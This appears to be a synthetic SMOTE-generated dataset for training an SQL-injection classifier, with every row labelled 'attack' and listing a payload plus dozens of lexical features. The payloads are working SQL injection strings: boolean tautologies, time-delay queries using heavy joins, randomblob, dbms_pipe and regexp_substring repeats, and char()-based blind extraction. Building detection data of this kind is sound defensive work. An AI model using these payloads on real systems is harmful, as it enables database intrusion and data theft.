id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000133,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",nearest_attack_euclidean,R000046,0.5128662358462336,124.34228252118344,27.0,4.0015723036422495,70.35892609745798,6.388993455507695,30.060134716099416,17.534228252118346,0.5739848911836047,0.04890750378397389,0.2356052252829328,0.14150237974948854,2.6794630487289934,0.0,0.0,0.0,1.0,1.106845650423669,0.0,3.7479195529656817,0.0,5.0,4.0,2.106845650423669,0.8931543495763312,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.106845650423669,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.106845650423669
SMOTE_000134,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000012,1.4895816183951642,70.23583513125546,25.68868919196039,3.884334757175333,20.462262161607924,14.613213515176234,23.698097292863377,11.462262161607923,0.29170126305014554,0.2096232237629529,0.3354287648238679,0.16324674836303366,4.0,0.0,0.5377378383920777,0.0,0.0,2.0,0.0,2.924524323215845,0.0,1.0,1.0,2.537737838392078,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.462262161607922,0.5377378383920777,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,boolean,"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000033,0.07867345952818787,118.00345966146106,29.0,4.0816869138804135,65.0,8.0,31.836216384550887,13.167243276910177,0.5512340238524502,0.0678441875510708,0.2693785243150574,0.11154326428142164,0.0,0.0,2.0,0.0,1.0,1.0,0.0,4.167243276910178,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,0.38673960075863867,136.51056968864825,30.37764242216206,3.929401721035109,65.75528484432412,8.125880807387354,45.25176161477471,17.37764242216206,0.48167177748660217,0.05950664406591619,0.33162066928724687,0.12720090916023472,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.0,0.1258808073873534,0.0,2.1258808073873534,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.8741191926126466,0.12588080738735347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000137,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000135,2.2637880955084535,34.150895146017334,15.484910485398267,3.082643803359524,2.5150895146017334,10.4547314561948,15.150895146017334,6.030179029203467,0.07306437279523925,0.319519425709497,0.43135898123282884,0.17605722026243492,0.4849104853982662,0.5150895146017338,0.4849104853982662,0.0,0.0,1.0,0.0,2.0301790292034685,0.5150895146017338,0.0,0.0,1.4849104853982658,0.48491048539826626,0.5150895146017338,0.0,1.0000000000000002,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.5150895146017338,0.4849104853982662,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000138,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,0.6651589358653222,119.62786650179555,29.319163207020384,4.095434150938294,67.51079527722422,8.0,31.638326414040765,12.478744810530575,0.5630167874858617,0.06732953309092002,0.2653347630470426,0.10431891637617569,0.638326414040767,0.8404183964898083,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.0,2.0,0.15958160351019157,0.8404183964898084,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.15958160351019157,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.159581603510192
SMOTE_000139,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000139,0.32915891395598623,45.48248130795888,19.71248961553271,3.402161233858826,4.827493769319624,15.769991692426167,17.884995846213087,7.0,0.10555364679724347,0.3464746867945133,0.3936692981096017,0.15430236829864152,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.942497923106542,0.05750207689345843,0.0,0.9424979231065418,2.0,1.0,0.0,0.0,0.05750207689345828,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000140,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,0.1633636561459948,138.17038309241073,38.11358872827381,3.963018933549878,43.17038309241072,23.0,53.943205635863094,18.056794364136906,0.3124260660797111,0.16646526821228047,0.390428702372234,0.1306799633357745,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.056794364136906,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.05679436413690664,0.0,1.0,0.0,0.9432056358630935,0.05679436413690664,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0567943641369064
SMOTE_000141,attack,boolean,1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R000115,1.5535852700070147,370.2817840339499,33.48327156107901,3.422785183532873,99.45650605880542,50.03345687784199,168.54349394119458,52.248327156107905,0.2694231000516456,0.1346595371335094,0.45471534098881455,0.14120202182603048,2.4966543122158007,0.0,0.0,0.0,0.0,1.7516728438920997,0.0,35.006691375568394,0.0,0.49665431221580064,0.9933086244316014,13.2550185316763,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.24832715610790038,1.7516728438920997,0.0,0.7516728438920997,0.24832715610790032,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.758364219460498,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.5100370633526
SMOTE_000142,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,0.8863644145436261,41.43897205285222,13.122055894295562,2.7602931416822964,2.0,12.0,20.0,7.43897205285222,0.048286938032318816,0.28972162819391273,0.4828693803231878,0.17912205345058063,1.0,0.0,2.438972052852219,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.438972052852219,1.0,0.0,0.7194860264261096,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000143,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,2.0022230021692193,167.17068848697545,36.41465575651227,3.977966276674342,53.48793453907361,22.756032730463193,62.170688486975465,28.75603273046319,0.3202768543019969,0.1359943733678283,0.37183951405097354,0.17188925827920123,4.829311513024539,0.0,0.20732787825613463,0.0,0.0,2.0,0.0,11.170688486975461,0.0,1.5853442434877305,0.7926721217438654,9.378016365231597,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.7926721217438653,0.20732787825613466,0.20732787825613475,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.20732787825613475,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2073278782561348,0.2073278782561348,3.829311513024539
SMOTE_000144,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000155,0.0003228849241245592,55.99943018056955,22.999511583345324,3.761467833680686,12.999511583345324,20.0,17.999837194448446,5.0000814027757805,0.2321355890378769,0.357147010345703,0.321428986748856,0.0892884138675641,0.0,0.9999185972242208,1.0001628055515581,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.000162805551558,0.0,0.999918597224221,8.140277577911581e-05,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000145,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R000119,1.0663088708705188,306.8274439849431,40.155723999514294,4.023260799938767,117.76641400072856,34.07786199975715,112.8152379881002,42.1679299963572,0.3849048344188627,0.11130359170037292,0.36662188412458574,0.13716968975617866,3.6885520009714132,0.31144799902858683,0.0,0.0,0.0,2.0,0.0,22.93434399708576,0.0,2.922138000242853,3.077861999757147,8.311447999028587,0.9221380002428533,0.0778619997571467,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9221380002428534,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.155723999514294,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.077861999757147
SMOTE_000146,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000148,0.18591187635797193,148.5780853225014,32.93972647464306,4.121428542541506,75.57808532250141,16.0,41.0,16.0,0.5086114107449949,0.10770160860383673,0.27598537204733165,0.10770160860383673,0.939726474643057,0.06027352535694297,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.9397264746430569,0.06027352535694297,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000147,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000045,0.7821926113599922,121.0,28.0,4.015868317430159,62.0,10.0,30.0,19.0,0.512396694214876,0.08264462809917356,0.24793388429752067,0.15702479338842976,0.7443255418730289,0.2556744581269712,2.0,0.0,1.0,1.0,0.0,4.0,0.9999999999999998,5.0,4.0,4.0,0.744325541873029,0.255674458126971,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000148,attack,boolean," end and   (  ""xksk""  =  ""xksk",nearest_attack_euclidean,R000019,1.92473007942693,71.57211524331929,18.898701896230662,3.287543796907292,28.55024033516175,5.8200961340647,26.797403792461328,10.404374981631507,0.42935835811496986,0.04476997026203615,0.37093047335828916,0.15494119826470482,0.0,3.0,0.0,0.0,0.0,1.0,0.0,4.741490371898736,0.0,0.4157211524331928,1.2471634572995784,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.41572115243319296,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4157211524331927
SMOTE_000149,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,1.6315739075646574,139.43360997787786,33.53146611234012,3.91972824475359,57.93015218043599,18.65733056170059,47.37759334808142,15.468533887659882,0.40937744334065496,0.1355092214789355,0.3439460730452963,0.1111672621351133,0.46853388765988213,0.0,2.0,0.0,1.0,2.0,0.0,6.594398337020354,0.0,0.531466112340118,1.4685338876598821,5.0,0.468533887659882,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000150,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000107,1.168431517115839,55.33981650950932,22.33981650950932,3.7347168835882103,13.660183490490688,18.01944952852795,18.0,5.660183490490683,0.2469326820921614,0.3254197543530451,0.32528678663273775,0.10236077692205572,0.0,1.0,1.6601834904906827,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.6601834904906827,0.0,1.0,0.6601834904906827,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.6601834904906828,0.3398165095093173,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000098,0.13141170127735424,209.5404544916758,29.03172925018096,3.467801983899586,109.6356422422187,11.873082999276157,65.0,23.03172925018096,0.522450956901684,0.056605918682957335,0.31078186006149855,0.11016126435386009,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.063458500361921,1.9999999999999998,0.0,5.873082999276158,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0317292501809605,0.9682707498190395,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000152,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.11412628054972176,103.12504288912643,31.0,3.585378296107415,24.663486832048925,16.0,46.17308352140407,16.288472535673446,0.23812227976150435,0.15561113292824205,0.4486095498736893,0.15765703743656434,4.0,0.0,0.9711527464326555,0.0,0.0,1.0288472535673445,0.0,8.05769450713469,0.0,1.0288472535673443,1.0,2.1730835214040662,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.02884725356734455,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000153,attack,boolean,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000105,0.6259205164327878,243.94901334122676,37.347217297937306,3.815188972455023,73.17127495772833,32.78240576597911,97.38886919174922,40.60646342577013,0.29972381460713,0.13484401647778238,0.3995403045809916,0.16589186433409597,0.7824057659791025,0.0,2.0,0.0,0.0,2.0,0.0,21.129623063916412,0.0,1.7824057659791024,3.7824057659791026,13.129623063916412,0.7824057659791025,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.564811531958204,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.564811531958206
SMOTE_000154,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,1.8084058362695905,43.83905448710111,15.678108974202233,3.037795110110365,3.379290865325835,13.839054487101116,19.08047275644944,7.540236378224721,0.07569984853492906,0.31427103240840243,0.43716292237518334,0.17286619668148517,1.0,0.0,2.0804727564494416,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.4597636217752792,3.0804727564494416,1.0,0.0,0.5402363782247208,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000155,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000129,2.4624967426940714,125.81331942127471,27.20887961418314,3.6076415392655306,46.906659710637356,13.302219903545785,51.093340289362644,14.511099517728924,0.3727675627010171,0.10570112379423735,0.4065311157552533,0.11500019774949227,0.0,3.6977800964542147,0.0,0.0,0.0,1.0,0.0,8.60443980709157,0.0,0.3022199035457849,0.9066597106373545,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.697780096454215,-2.7755575615628914e-17,0.6977800964542151,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3022199035457849,0.0,0.0,0.0,0.0,0.0,0.0,0.6977800964542151,0.6977800964542151,3.3955601929084303
SMOTE_000156,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000106,0.2167455737813424,40.000000000000014,12.96319547031311,2.6574127688472196,2.0,12.0,20.0,6.000000000000002,0.04999999999999999,0.3,0.5,0.15,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000157,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,0.7626505380486951,67.24560407571222,25.409772301938336,3.8009844686710603,14.606514867958886,20.803257433979446,22.819544603876672,9.016287169897225,0.21779897439322418,0.3112424323440317,0.33864123072813096,0.13231736253461313,0.0,1.0,1.803257433979445,0.0,0.0,2.0,0.0,2.6065148679588903,0.0,0.8032574339794449,0.803257433979445,3.803257433979445,0.0,1.0,0.8032574339794449,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.8032574339794449,0.19674256602055518,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,0.46133102421359407,212.80731431312037,34.8006649375564,3.7607034517983116,61.80398962533838,32.598005187330806,86.40531950045118,32.0,0.2903100083839756,0.15336837795841934,0.40588463367629757,0.15043697998130753,0.0,0.19933506244360277,2.0,0.0,0.0,2.0,0.0,17.800664937556398,0.0,1.0,3.0,10.0,0.0,0.1993350624436028,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000159,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000103,1.1463215040209556,198.00629099302427,33.18549585150737,3.724999040995223,60.89121888630529,25.481869814384215,78.89121888630528,32.74198340602948,0.30558361403154966,0.1307571413989243,0.39929302945020106,0.164366215119325,1.8891218886305285,0.0,0.0,0.0,0.0,1.2963739628768427,0.0,17.778243777261057,0.0,1.2963739628768427,3.296373962876843,8.481869814384215,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.29637396287684276,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.592747925753685,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.8891218886305285
SMOTE_000160,attack,boolean,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,nearest_attack_euclidean,R000089,0.3569054345883924,382.31793278480393,28.255775205698537,3.101176797171247,81.10835922469367,57.74422479430146,190.55060716770828,52.91474159810049,0.2122128247886744,0.15102940292218509,0.49835223290200115,0.1384055393871393,0.17051680379902567,0.0,0.9147415981004872,0.0,0.0,2.0,0.0,39.65896639240195,0.0,0.0,0.0,13.085258401899512,0.08525840189951284,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0852584018995128,0.0,0.08525840189951286,0.0,1.0,0.9147415981004872,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.085258401899512
